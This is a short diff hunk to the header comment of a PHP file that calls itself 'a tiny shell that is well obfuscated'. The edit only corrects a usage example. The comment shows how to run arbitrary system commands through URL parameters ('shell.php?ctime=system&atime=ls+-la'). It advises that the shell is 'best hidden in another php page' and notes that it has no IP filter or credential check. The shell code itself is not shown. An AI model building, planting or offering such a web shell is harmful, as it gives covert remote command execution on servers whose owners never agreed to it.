@@ -23,7 +23,7 @@
 ***
 *** This is a tiny shell that is well obfuscated
 *** to use it run it thusly:
-***   http://Site/shell.php?ctime=system&atime=ls+la
+***   http://Site/shell.php?ctime=system&atime=ls+-la
 *** It is best hidden in another php page
 ***
 *** WARNING: This shell is not protected by an ip filter or credential check
